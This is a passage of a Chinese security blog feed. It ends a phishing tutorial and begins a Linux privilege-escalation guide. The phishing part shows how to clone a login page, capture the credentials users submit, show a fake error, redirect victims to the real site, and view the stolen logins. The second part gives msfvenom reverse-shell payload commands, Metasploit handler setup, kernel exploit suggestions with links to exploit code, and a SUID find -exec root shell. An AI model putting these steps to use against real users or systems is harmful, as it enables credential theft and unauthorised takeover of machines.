src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710180145-c6c7245e-1f08-1.png"></p><p>使用ctrl+s把网站前端代码保存下来</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710181323-66fae18a-1f0a-1.png"></p><p>但是放到网站目录下访问却会出现一些偏差，密码框被拉长了</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710181318-63f94e9a-1f0a-1.png"></p><p>经过一番调试，需要把密码框前的标签中的id属性删除，再访问就不会有问题了   </p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174143-fa55a726-1f05-1.png"></p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710181100-11c21800-1f0a-1.png"></p><p>现在两个界面除了url以外，其他的地方基本上都一样了</p><p>使用F12寻找原网站的账号密码在form标签中的name值</p><p>账号的name值:logonId</p><p>密码的name值:password_rsainput</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710180703-84597d14-1f09-1.png"></p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710180708-8793d8e4-1f09-1.png"></p><p>把表单内容提交到check.php，为了保证真实性，让用户在第一次输入完账户密码后弹一个“该账户不存在或登录密码出错已达上限，请更换账户。”，然后再跳转到真实网址上。</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174329-39a9b412-1f06-1.png"></p><p>但是只修改这部分会出现问题，就是只能接收到账号，接收不到密码</p><p>经排查，需要将密码的name值做修改，不能使用网页原来的值,这里将其修改为passwordaa，确保不会重复   </p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174336-3dc88b54-1f06-1.png"></p><p>Check.php里也需要修改</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174342-41a2f188-1f06-1.png"></p><p>再尝试登录钓鱼网站</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710180801-a71f82bc-1f09-1.png"></p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174353-47ed9020-1f06-1.png"></p><p>成功接收到了用户输入的账号密码</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174359-4bd46e2a-1f06-1.png"></p><p>不过这样用户名密码的查看并不方便，写个show.php来进行展示</p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174659-b6ab700e-1f06-1.png"></p><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174704-ba1d289a-1f06-1.png"></p><p>为了使网站跟看起来更真实，还可以购买域名进行一些伪装</p><p>原文链接：<a href="https://xz.aliyun.com/t/12682?time%5C_%5C_1311=mqmhDvqIOh7D/D0l8Gk8qPODAEt+8WeD">https://xz.aliyun.com/t/12682?time\_\_1311=mqmhDvqIOh7D%2FD0l8Gk8qPODAEt%2B8WeD</a></p>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>钓鱼社工</category>
      
    </categories>
    
    
    <tags>
      
      <tag>社工</tag>
      
      <tag>钓鱼</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux提权（一）</title>
    <link href="/2024/06/26/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/Linux%E6%8F%90%E6%9D%83%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2024/06/26/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/Linux%E6%8F%90%E6%9D%83%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a><strong>前情提要</strong></h2><p>Linux：</p><p>getuid</p><p>系统用户：UID(0-999)</p><p>普通用户：UID(1000-*)</p><p>root用户：UID为0，拥有系统的完全控制权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">┌──(root㉿kali)-[~]<br>└─# id      <br>用户id=0(root) 组id=0(root) 组=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),121(bluetooth),133(scanner),141(kaboxer)<br> <br></code></pre></td></tr></table></figure><h2 id="MSF-Linux上线"><a href="#MSF-Linux上线" class="headerlink" title="MSF Linux上线"></a><strong>MSF Linux上线</strong></h2><h3 id="show-options-看需要配置什么"><a href="#show-options-看需要配置什么" class="headerlink" title="show options  (看需要配置什么)"></a><strong>show options  (看需要配置什么)</strong></h3><p>有初学的师傅上线Linux生成马子就干，不急先使用show options命令看有没有需要配置的东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">监听器的设置<br>msf6 exploit(multi/handler) &gt; show options<br><br>Module options (exploit/multi/handler):<br><br>  Name Current Setting Required Description<br>  ---- --------------- -------- -----------<br><br><br>Payload options (php/meterpreter/reverse_tcp):<br><br>  Name   Current Setting Required Description<br>  ----   --------------- -------- -----------<br>  LHOST 填写自己攻击机的IP yes       The listen address (an interface may be specified)<br>  LPORT 8888             yes       The listen port<br><br><br>Exploit target:<br><br>  Id Name<br>  -- ----<br>  0   Wildcard Target<br> <br> <br>msf6 exploit(multi/handler) &gt;set LHOST 填写自己攻击机的IP<br></code></pre></td></tr></table></figure><h3 id="哥斯拉PMeterpreter模块转MSF的坑"><a href="#哥斯拉PMeterpreter模块转MSF的坑" class="headerlink" title="哥斯拉PMeterpreter模块转MSF的坑"></a><strong>哥斯拉PMeterpreter模块转MSF的坑</strong></h3><p>哥斯拉和自己生成的马子不一样，注意设置payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">自己生成马子上线<br><br>msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf &gt; mshell.elf<br><br>监听器payload设置<br>msf6 exploit(multi/handler) &gt;set payload linux/x64/meterpreter/reverse_tcp<br><br>哥斯拉转发上线<br>监听器payload<br>msf6 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp<br><br>###一个是马子上线，一个是shell上线不一样，建议还是直接哥斯拉上线，上传马子太敏感了<br><br><br>报错<br>msf6 exploit(multi/handler) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.1.11:8888<br>[*] Sending stage (3020772 bytes) to 192.168.1.5<br>[-] Meterpreter session 1 is not valid and will be closed<br>[*] - Meterpreter session 1 closed.<br><br>###这就是payload设置没对session断掉了<br> <br></code></pre></td></tr></table></figure><h3 id="MSF经常使用技巧"><a href="#MSF经常使用技巧" class="headerlink" title="MSF经常使用技巧"></a><strong>MSF经常使用技巧</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">background     ###返回上一级，经常用到<br>show options   ###使用模块攻击前先配置好，别又报错了<br>exit   ###退出不建议用还是用上面的background好<br><br>sessions   ###查看当前连接的session如下<br>msf6 exploit(multi/handler) &gt; sessions<br><br>search 漏洞名称     ###查找msf的漏洞脚本<br><br>Active sessions<br>===============<br><br>Id Name Type                   Information         Connection<br>-- ---- ----                   -----------         ----------<br>4         meterpreter php/linux www-data @ darkhole 192.168.1.11:8888 -&gt; 192.168.1.5:51266 (192.168.1.5)<br><br><br>sessions -i 4   ###指定进入session<br>msf6 exploit(multi/handler) &gt; sessions -i 4<br>[*] Starting interaction with 4...<br><br> <br></code></pre></td></tr></table></figure><h3 id="MSF生成马子的坑"><a href="#MSF生成马子的坑" class="headerlink" title="MSF生成马子的坑"></a><strong>MSF生成马子的坑</strong></h3><p>问题根源：msf版本不同导致语法不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">msf5版本生成马子的命令<br>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf &gt; mshell.elf<br><br><br>msf6版本生成马子的命令<br>msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf &gt; mshell.elf<br><br>###小坑一个我先给踩了<br></code></pre></td></tr></table></figure><h2 id="内核溢出提权（比较主流的提权）"><a href="#内核溢出提权（比较主流的提权）" class="headerlink" title="内核溢出提权（比较主流的提权）"></a><strong>内核溢出提权（比较主流的提权）</strong></h2><h3 id="流程："><a href="#流程：" class="headerlink" title="流程："></a><strong>流程：</strong></h3><p>信息收集系统内核等信息——&gt;筛选适用的脚本——&gt;提权</p><p>不建议使用msf自动的那个模块，不是很好用</p><p>1、信息收集</p><p>当前主机的操作系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">hostnamectl<br>cat /etc/*-release<br>lsb_release -a<br>cat /etc/lsb-release # Debain<br>cat /etc/redhat-release # Redhat<br>cat /etc/centos-release # Centos<br>cat /etc/os-release # Ubuntu<br>cat /etc/issue<br></code></pre></td></tr></table></figure><p>实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">hostnamectl<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">hostnamectl   ###这个就够用别一个一个测<br>  Static hostname: darkhole<br>        Icon name: computer-vm<br>          Chassis: vm<br>      Machine ID: 0d436af297774adfa085d28ed92d4210<br>          Boot ID: 598921d4c2d646f4a89ee08cd97c986e<br>  Virtualization: vmware<br>Operating System: Ubuntu 20.04.2 LTS<br>          Kernel: Linux 5.4.0-182-generic<br>    Architecture: x86-64<br> <br></code></pre></td></tr></table></figure><p>当前主机的内核版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">hostnamectl<br>uname -a     ###用这一条差不多了<br>uname -r<br>cat /proc/version<br>dmesg | grep &quot;Linux version&quot;<br></code></pre></td></tr></table></figure><p>实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">uname -a<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">uname -a<br>Linux darkhole 5.4.0-182-generic #202-Ubuntu SMP Fri Apr 26 12:29:36 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux<br></code></pre></td></tr></table></figure><p>2、内核漏洞筛选：</p><p>MSF检测：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">msf6 exploit(multi/handler) &gt; use post/multi/recon/local_exploit_suggester<br>msf6 post(multi/recon/local_exploit_suggester) &gt; show options<br><br>Module options (post/multi/recon/local_exploit_suggester):<br><br>  Name             Current Setting Required Description<br>  ----             --------------- -------- -----------<br>  SESSION                           yes       The session to run this module on<br>  SHOWDESCRIPTION false           yes       Displays a detailed description for the available exploits<br><br>msf6 post(multi/recon/local_exploit_suggester) &gt; set session 4<br>session =&gt; 4<br>msf6 post(multi/recon/local_exploit_suggester) &gt; run<br><br>[*] 192.168.1.5 - Collecting local exploits for php/linux...<br>[-] 192.168.1.5 - No suggestions available.<br>[*] Post module execution completed<br><br><br>###公开版检测没有，实在是垃圾建议使用其他脚本工具，或者使用msfpro版本那个挺厉害的<br></code></pre></td></tr></table></figure><p>提权脚本:</p><p><a href="https://github.com/liamg/traitor">https://github.com/liamg/traitor</a></p><p><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">https://github.com/The-Z-Labs/linux-exploit-suggester</a></p><p><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></p><p><a href="https://github.com/belane/linux-soft-exploit-suggester">https://github.com/belane/linux-soft-exploit-suggester</a></p><p>综合脚本:</p><p><a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p><p><a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></p><p><a href="https://github.com/redcode-labs/Bashark">https://github.com/redcode-labs/Bashark</a></p><p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><h2 id="提权脚本（都大差不差就写一个了）"><a href="#提权脚本（都大差不差就写一个了）" class="headerlink" title="提权脚本（都大差不差就写一个了）"></a><strong>提权脚本（都大差不差就写一个了）</strong></h2><h3 id="linux-exploit-suggester项目"><a href="#linux-exploit-suggester项目" class="headerlink" title="linux-exploit-suggester项目"></a><strong>linux-exploit-suggester项目</strong></h3><h4 id="工具的介绍"><a href="#工具的介绍" class="headerlink" title="工具的介绍"></a><strong>工具的介绍</strong></h4><p>Linux_Exploit_Suggester是一款根据Linux操作系统版本号自动查找相应提权脚本的工具，旨在帮助检测给定 Linux 内核&#x2F;基于 Linux 的机器的安全缺陷。</p><p>项目地址：<a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><p>Highly probable：评估的内核很可能受到影响，并且 PoC 漏洞利用很有可能不用在任何重大修改的情况下开箱即用Probable：漏洞利用可能会起作用，但很可能需要定制 PoC 漏洞利用以适合目标使用Less probable：需要额外的手动分析来验证内核是否受到影响Unprobable：内核极不可能受到影响（漏洞利用不会显示在工具的输出中）</p><h4 id="工具的使用"><a href="#工具的使用" class="headerlink" title="工具的使用"></a><strong>工具的使用</strong></h4><p>1 上传脚本然后直接运行     ###注意给脚本权限   chmod +x 1.sh</p><p>2 优先看有Tags字段的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs text-plain"><br>[+] [CVE-2022-2586] nft_object UAF<br><br>  Details: https://www.openwall.com/lists/oss-security/2022/08/29/5<br>  Exposure: probable<br>  Tags: [ ubuntu=(20.04) ]&#123;kernel:5.12.13&#125;<br>  Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1<br>  Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)<br><br>[+] [CVE-2021-4034] PwnKit<br><br>  Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt<br>  Exposure: probable<br>  Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro<br>  Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main<br><br>[+] [CVE-2021-3156] sudo Baron Samedit<br><br>  Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt<br>  Exposure: probable<br>  Tags: mint=19,[ ubuntu=18|20 ], debian=10<br>  Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main<br><br><br>### 截取了部分响应，具体怎么操作建议自行实验<br> <br></code></pre></td></tr></table></figure><p>3 选择脚本直接提权</p><p>不一定使用他提供的脚本地址</p><p>例如<br>Download URL: <a href="https://codeload.github.com/berdav/CVE-2021-4034/zip/main">https://codeload.github.com/berdav/CVE-2021-4034/zip/main</a>  </p><p>反正我没成功<br>推荐一个脚本POC集成项目，根据漏洞编号找  </p><p><a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a><br><a href="https://github.com/nomi-sec/PoC-in-GitHub/tree/master">https://github.com/nomi-sec/PoC-in-GitHub/tree/master</a></p><h2 id="SUID提权（普通用户权限使用）"><a href="#SUID提权（普通用户权限使用）" class="headerlink" title="SUID提权（普通用户权限使用）"></a><strong>SUID提权（普通用户权限使用）</strong></h2><h3 id="前情提要-1"><a href="#前情提要-1" class="headerlink" title="前情提要"></a><strong>前情提要</strong></h3><p>众所周知，在 Linux 中一切都是一个文件，而文件的权限有rwx（即读&#x2F;写&#x2F;执行），所有者、所有组、其它用户的rwx权限是彼此独立的。</p><p>文件所有者和超级用户可以修改文件或目录的权限。可以使用绝对模式（八进制数字模式），符号模式指定文件的权限（chmod 754）。</p><p>其实在Linux的权限设置中还存在着除rwx，的第四类权限位，即；</p><p>SUID(Set UID)：</p><p>suid权限仅对二进制程序有效（binary program）；执行者对于该程序需要具有x的可执行权限；本权限仅在执行该程序的过程中有效（run-time）；执行者将具有该程序拥有者的权限。</p><p>SGID(Set SGID)：</p><p>SGID对二进制文件有用；程序执行者对该程序来说，具有x权限；执行者在执行的过程中将获得该程序群组的权限；</p><p>Sticky Bit</p><p>SBIT只针对目录有效；除非目录的属主和root用户有权限删除它，除此之外其它用户不能删除和修改这个目录；</p><h3 id="使用PEASS-ng工具探测"><a href="#使用PEASS-ng工具探测" class="headerlink" title="使用PEASS-ng工具探测"></a><strong>使用PEASS-ng工具探测</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">###在你执行了以后不光可以直接用脚本来进行sudo提权<br><br>执行以后会有这样一个模块Files with Interesting Permissions<br><br>例子（截取部分代码）<br>══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                    <br>╔══════════╣ SUID - Check easy privesc, exploits and write perms<br>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid            <br>strace Not Found                                                                            <br>-rwsr-xr-x 1 root root 87K Dec 10 2012 /bin/mount ---&gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                                                                            <br>-rwsr-xr-x 1 root root 31K Apr 13 2011 /bin/ping<br>-rwsr-xr-x 1 root root 35K Feb 27 2017 /bin/su<br>-rwsr-xr-x 1 root root 35K Apr 13 2011 /bin/ping6<br>-rwsr-xr-x 1 root root 67K Dec 10 2012 /bin/umount ---&gt; BSD/Linux(08-1996)<br>-rwsr-sr-x 1 daemon daemon 50K Oct 4 2014 /usr/bin/at ---&gt; RTru64_UNIX_4.0g(CVE-2002-1614)<br>-rwsr-xr-x 1 root root 36K Feb 27 2017 /usr/bin/chsh<br>-rwsr-xr-x 1 root root 45K Feb 27 2017 /usr/bin/passwd ---&gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                              <br>-rwsr-xr-x 1 root root 31K Feb 27 2017 /usr/bin/newgrp ---&gt; HP-UX_10.20<br>-rwsr-xr-x 1 root root 44K Feb 27 2017 /usr/bin/chfn ---&gt; SuSE_9.3/10<br>-rwsr-xr-x 1 root root 65K Feb 27 2017 /usr/bin/gpasswd<br>-rwsr-sr-x 1 root mail 82K Nov 18 2017 /usr/bin/procmail<br>-rwsr-xr-x 1 root root 159K Jan 6 2012 /usr/bin/find<br><br><br>###<br>我们看什么呢？<br>###<br>就看标红的文件或者命令<br>sudo的原理简单来说，就是其他用户调用一些命令的时候不会因为权限问题受限，root可以调用，web用户也可以调用<br>我用到的就是find命令来进行sudo提权<br>###<br>为什么用find？<br>###<br>因为find可以调用-exec来执行命令<br>####<br>使用“-exec”提权,也就是find+perms+exec 命令来提权。这里有两种方法可以用<br><br>1. find ./ acce -exec &#x27;/bin/sh&#x27; \;<br>2.<br>touch bcce<br>find bcce -exec &#x27;/bin/sh&#x27; \;<br></code></pre></td></tr></table></figure><p>实际效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">/usr/bin/find . -exec &#x27;whoami&#x27; \;                <br>root<br>root<br>root<br>root<br>root<br><br><br>###总的来说啊就是/bin/sh这个位置可以替换成命令<br>然后我们可以弹一个root权限的shell回来<br>也可以直接提权起一个root终端<br>#####<br></code></pre></td></tr></table></figure><h3 id="使用命令进行探测"><a href="#使用命令进行探测" class="headerlink" title="使用命令进行探测"></a><strong>使用命令进行探测</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">命令：SUID GUID<br>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -perm -g=s -type f 